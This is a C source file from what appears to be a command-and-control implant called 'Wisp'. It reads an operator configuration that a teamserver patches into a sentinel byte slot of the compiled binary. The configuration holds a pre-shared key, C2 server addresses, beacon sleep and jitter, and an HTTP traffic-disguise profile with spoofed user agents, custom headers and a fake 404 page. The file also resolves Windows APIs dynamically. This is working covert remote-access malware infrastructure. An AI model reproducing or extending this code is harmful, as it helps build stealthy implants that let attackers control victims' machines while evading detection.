#include "WispConfig.h"
#include "WispDefines.h"
#include "WispJson.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "utils.h"

#if defined(DEBUG)
static void wisp_wcfglog(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define WCLOG(...) do { char __lb[512]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); wisp_wcfglog(__lb); } } while (0)
#else
#define WCLOG(...) do { } while (0)
#endif

// The compile-time sentinel: 4096 bytes starting with WISPCFG\x01. The
// teamserver patches JSON into this exact byte range (same-size replacement).
// __declspec(dllexport) keeps the linker from discarding it even in unused
// static-library objects; in the final link the symbol is referenced by
// WispConfigLoad itself.
__declspec(dllexport) BYTE WISP_SENTINEL_SLOT[WISP_CFG_SLOT_SIZE] = {
	0x57, 0x49, 0x53, 0x50, 0x43, 0x46, 0x47, 0x01
};

//////// helpers ////////

static char* wstrdup_range(const char* s, ULONG n)
{
	char* c = (char*)MemAllocLocal(n + 1);
	if (!c)
		return NULL;
	memcpy(c, s, n);
	c[n] = 0;
	return c;
}

static char* wj_strdup(WJVal* v)
{
	if (!v || v->type != WJ_STR)
		return NULL;
	return wstrdup_range(v->str, StrLenA(v->str));
}

static void cfg_copy(char* dst, ULONG cap, const char* src)
{
	ULONG i = 0;
	if (!dst || cap == 0) return;
	if (src) {
		while (src[i] && i + 1 < cap) { dst[i] = src[i]; i++; }
	}
	dst[i] = 0;
}

static void wisp_config_profile(WispConfig* cfg, WJVal* root)
{
	WispProfile* pr = &cfg->profile;
	WJVal* pf;
	WJVal* v;
	ULONG i;
	memset(pr, 0, sizeof(*pr));
	cfg_copy(pr->name, sizeof(pr->name), "generic");
	cfg_copy(pr->uris[0], sizeof(pr->uris[0]), "/submit");
	pr->uriCount = 1;
	cfg_copy(pr->method, sizeof(pr->method), "POST");
	cfg_copy(pr->dataSlot, sizeof(pr->dataSlot), "body");
	pr->nfStatus = 404;
	cfg_copy(pr->nfBody, sizeof(pr->nfBody), "<html><body><h1>404 Not Found</h1></body></html>");

	pf = WJObjGet(root, "profile");
	if (!pf || pf->type != WJ_OBJ) {
		v = WJObjGet(root, "path");
		if (v && v->type == WJ_STR && v->str && v->str[0])
			cfg_copy(pr->uris[0], sizeof(pr->uris[0]), v->str);
		return;
	}
	v = WJObjGet(pf, "name");
	if (v && v->type == WJ_STR && v->str) cfg_copy(pr->name, sizeof(pr->name), v->str);
	v = WJObjGet(pf, "method");
	if (v && v->type == WJ_STR && v->str) cfg_copy(pr->method, sizeof(pr->method), v->str);
	v = WJObjGet(pf, "data");
	if (v && v->type == WJ_STR && v->str) cfg_copy(pr->dataSlot, sizeof(pr->dataSlot), v->str);
	v = WJObjGet(pf, "uris");
	if (v && v->type == WJ_ARR && v->count) {
		pr->uriCount = 0;
		for (i = 0; i < v->count && pr->uriCount < 4; i++) {
			WJVal* u = v->items[i];
			if (u && u->type == WJ_STR && u->str)
				cfg_copy(pr->uris[pr->uriCount++], sizeof(pr->uris[0]), u->str);
		}
		if (!pr->uriCount) {
			cfg_copy(pr->uris[0], sizeof(pr->uris[0]), "/submit");
			pr->uriCount = 1;
		}
	}
	v = WJObjGet(pf, "ua_pool");
	if (v && v->type == WJ_ARR) {
		pr->uaCount = 0;
		for (i = 0; i < v->count && pr->uaCount < 4; i++) {
			WJVal* u = v->items[i];
			if (u && u->type == WJ_STR && u->str)
				cfg_copy(pr->uaPool[pr->uaCount++], sizeof(pr->uaPool[0]), u->str);
		}
	}
	v = WJObjGet(pf, "headers");
	if (v && v->type == WJ_ARR) {
		pr->headerCount = 0;
		for (i = 0; i < v->count && pr->headerCount < 6; i++) {
			WJVal* h = v->items[i];
			WJVal* k;
			WJVal* val;
			if (!h || h->type != WJ_OBJ) continue;
			k = WJObjGet(h, "key");
			val = WJObjGet(h, "value");
			if (k && k->type == WJ_STR && val && val->type == WJ_STR) {
				cfg_copy(pr->headers[pr->headerCount].key, sizeof(pr->headers[0].key), k->str);
				cfg_copy(pr->headers[pr->headerCount].value, sizeof(pr->headers[0].value), val->str);
				pr->headerCount++;
			}
		}
	}
	v = WJObjGet(pf, "response");
	if (v && v->type == WJ_OBJ) {
		WJVal* st = WJObjGet(v, "status");
		WJVal* ct = WJObjGet(v, "content_type");
		WJVal* bd = WJObjGet(v, "body");
		if (st && st->type == WJ_NUM) pr->respStatus = (ULONG)WJNumAsI64(st, 0);
		if (ct && ct->type == WJ_STR && ct->str) cfg_copy(pr->respCT, sizeof(pr->respCT), ct->str);
		if (bd && bd->type == WJ_STR && bd->str) cfg_copy(pr->respBody, sizeof(pr->respBody), bd->str);
	}
	v = WJObjGet(pf, "not_found");
	if (v && v->type == WJ_OBJ) {
		WJVal* st = WJObjGet(v, "status");
		WJVal* bd = WJObjGet(v, "body");
		if (st && st->type == WJ_NUM) pr->nfStatus = (ULONG)WJNumAsI64(st, 404);
		if (bd && bd->type == WJ_STR && bd->str) cfg_copy(pr->nfBody, sizeof(pr->nfBody), bd->str);
	}
}
// parse a JSON config document into cfg (fields per PayloadCfg)
static BOOL wisp_config_parse(const char* json, ULONG len, WispConfig* cfg)
{
	WJVal* root = WJParse(json, len);
	if (!root || root->type != WJ_OBJ) {
		if (root) WJFree(root);
		return FALSE;
	}
	BOOL ok = FALSE;
	do {
		WJVal* psk = WJObjGet(root, "psk");
		if (!psk || psk->type != WJ_STR || !psk->str || !psk->str[0]) {
			WCLOG("[cfg] no psk\n");
			break;
		}
		cfg->psk = wj_strdup(psk);
		if (!cfg->psk)
			break;

		WJVal* servers = WJObjGet(root, "servers");
		if (!servers || servers->type != WJ_ARR || servers->count == 0) {
			WCLOG("[cfg] no servers\n");
			break;
		}
		cfg->serversCount = servers->count;
		cfg->servers = (char**)MemAllocLocal(servers->count * sizeof(char*));
		if (!cfg->servers)
			break;
		memset(cfg->servers, 0, servers->count * sizeof(char*));
		for (ULONG i = 0; i < servers->count; i++) {
			char* s = wj_strdup(servers->items[i]);
			if (!s)
				break;
			cfg->servers[i] = s;
		}

		WJVal* sl = WJObjGet(root, "sleep_ms");
		cfg->sleepMS = sl && sl->type == WJ_NUM ? (ULONG)sl->num : 3000;
		if (cfg->sleepMS < WISP_MIN_SLEEP_MS)
			cfg->sleepMS = 3000;
		WJVal* jt = WJObjGet(root, "jitter_pct");
		cfg->jitterPct = jt && jt->type == WJ_NUM ? (ULONG)jt->num : 30;
		if (cfg->jitterPct > WISP_MAX_JITTER_PCT)
			cfg->jitterPct = 30;
		WJVal* ins = WJObjGet(root, "insecure");
		cfg->insecure = ins && ins->type == WJ_BOOL ? ins->b : FALSE;
		{
			WJVal* pk = WJObjGet(root, "plugin_pubkey");
			cfg->pluginPubkey[0] = 0;
			if (pk && pk->type == WJ_STR && pk->str) {
				ULONG n = StrLenA(pk->str);
				if (n >= sizeof(cfg->pluginPubkey))
					n = sizeof(cfg->pluginPubkey) - 1;
				memcpy(cfg->pluginPubkey, pk->str, n);
				cfg->pluginPubkey[n] = 0;
			}
		}
		wisp_config_profile(cfg, root);
		ok = TRUE;
	} while (0);
	WJFree(root);
	return ok;
}

// find the unique complete sentinel slot in a mapped image (FindCfgSlot)
static BOOL wisp_find_slot(const BYTE* image, ULONG imageLen, const BYTE** jsonOut, ULONG* jsonLen)
{
	BYTE magic[8] = { 'W', 'I', 'S', 'P', 'C', 'F', 'G', 0x01 };
	const BYTE* p = image;
	const BYTE* end = image + imageLen;
	BOOL found = FALSE;
	while (p + WISP_CFG_SLOT_SIZE <= end) {
		// scan for the magic
		const BYTE* m = p;
		while (m + 8 <= end && memcmp(m, magic, 8) != 0)
			m++;
		if (m + 8 > end)
			break;
		if (m + WISP_CFG_SLOT_SIZE > end)
			break;
		const BYTE* slot = m;
		// header: magic(8) + u16 LE jsonLen
		ULONG n = slot[8] | (slot[9] << 8);
		BOOL valid = n > 0 && n <= WISP_CFG_SLOT_SIZE - WISP_CFG_HEADER_LEN;
		if (valid) {
			// padding after JSON must be zero through slot end
			for (ULONG i = WISP_CFG_HEADER_LEN + n; i < WISP_CFG_SLOT_SIZE; i++) {
				if (slot[i] != 0) {
					valid = FALSE;
					break;
				}
			}
		}
		if (valid) {
			if (found)
				return FALSE; // ambiguous
			*jsonOut = slot + WISP_CFG_HEADER_LEN;
			*jsonLen = n;
			found = TRUE;
		}
		p = slot + 1;
	}
	return found;
}

// read own executable and extract the patched sentinel slot
static BOOL wisp_config_from_image(WispConfig* cfg)
{
	CHAR path[MAX_PATH];
	if (!ApiWin->GetModuleFileNameA)
		return FALSE;
	if (!ApiWin->GetModuleFileNameA(NULL, path, MAX_PATH))
		return FALSE;
	HANDLE f = ApiWin->CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return FALSE;
	ULONG size = ApiWin->GetFileSize(f, NULL);
	BOOL ok = FALSE;
	if (size && size != 0xFFFFFFFF) {
		BYTE* img = (BYTE*)MemAllocLocal(size);
		if (img) {
			ULONG read = 0;
			if (ApiWin->ReadFile(f, img, size, (DWORD*)&read, NULL) && read == size) {
				const BYTE* json = NULL;
				ULONG jsonLen = 0;
				if (wisp_find_slot(img, size, &json, &jsonLen)) {
					ok = wisp_config_parse((const char*)json, jsonLen, cfg);
				}
			}
			MemFreeLocal((LPVOID*)&img, size);
		}
	}
	ApiWin->CloseHandle(f);
	return ok;
}

// -config <path> fallback for dev builds
static BOOL wisp_config_from_file(WispConfig* cfg)
{
	if (!ApiWin->GetCommandLineA)
		return FALSE;
	CHAR* cmd = ApiWin->GetCommandLineA();
	if (!cmd)
		return FALSE;
	// locate "-config" token (case-insensitive) then the next non-dash arg
	CHAR* p = cmd;
	ULONG len = StrLenA(cmd);
	CHAR* end2 = cmd + len;
	BOOL found = FALSE;
	while (p + 7 <= end2) {
		if (StrNCmpA(p, (CHAR*)"-config", 7) == 0 && (p[7] == ' ' || p[7] == '"' || p[7] == 0)) {
			p += 7;
			found = TRUE;
			break;
		}
		p++;
	}
	if (!found)
		return FALSE;
	while (p < end2 && (*p == ' ' || *p == '"'))
		p++;
	CHAR path[MAX_PATH];
	ULONG n = 0;
	while (p < end2 && *p != ' ' && *p != '"' && n < MAX_PATH - 1)
		path[n++] = *p++;
	path[n] = 0;
	if (!n)
		return FALSE;

	HANDLE f = ApiWin->CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return FALSE;
	ULONG size = ApiWin->GetFileSize(f, NULL);
	BOOL ok = FALSE;
	if (size && size != 0xFFFFFFFF && size < 64 * 1024) {
		BYTE* buf = (BYTE*)MemAllocLocal(size + 1);
		if (buf) {
			ULONG read = 0;
			if (ApiWin->ReadFile(f, buf, size, (DWORD*)&read, NULL) && read == size) {
				buf[size] = 0;
				ok = wisp_config_parse((const char*)buf, size, cfg);
			}
			MemFreeLocal((LPVOID*)&buf, size + 1);
		}
	}
	ApiWin->CloseHandle(f);
	return ok;
}

BOOL WispConfigLoad(WispConfig* cfg)
{
	memset(cfg, 0, sizeof(*cfg));
	if (wisp_config_from_image(cfg)) {
		WCLOG("[cfg] loaded from image slot\n");
		return TRUE;
	}
	if (wisp_config_from_file(cfg)) {
		WCLOG("[cfg] loaded from -config file\n");
		return TRUE;
	}
	WCLOG("[cfg] no config found\n");
	return FALSE;
}

void WispConfigFree(WispConfig* cfg)
{
	if (cfg->servers) {
		for (ULONG i = 0; i < cfg->serversCount; i++) {
			if (cfg->servers[i]) {
				ULONG n = StrLenA(cfg->servers[i]);
				MemFreeLocal((LPVOID*)&cfg->servers[i], n + 1);
			}
		}
		MemFreeLocal((LPVOID*)&cfg->servers, cfg->serversCount * sizeof(char*));
	}
	if (cfg->psk) {
		ULONG n = StrLenA(cfg->psk);
		MemFreeLocal((LPVOID*)&cfg->psk, n + 1);
	}
	memset(cfg, 0, sizeof(*cfg));
}

ULONG WispEffectiveSleep(ULONG baseMS, ULONG jitterPct)
{
	if (jitterPct == 0)
		return baseMS >= WISP_MIN_SLEEP_MS ? baseMS : WISP_MIN_SLEEP_MS;
	// delta in [0, base*jitter/100]; subtract a random part of it (matches
	// the original WaitMask semantics and stays within [base-delta, base])
	ULONG delta = (ULONG)((ULONG64)baseMS * jitterPct / 100);
	if (delta == 0)
		return baseMS;
	ULONG cut = GenerateRandom32() % delta;
	ULONG v = baseMS - cut;
	return v >= WISP_MIN_SLEEP_MS ? v : WISP_MIN_SLEEP_MS;
}
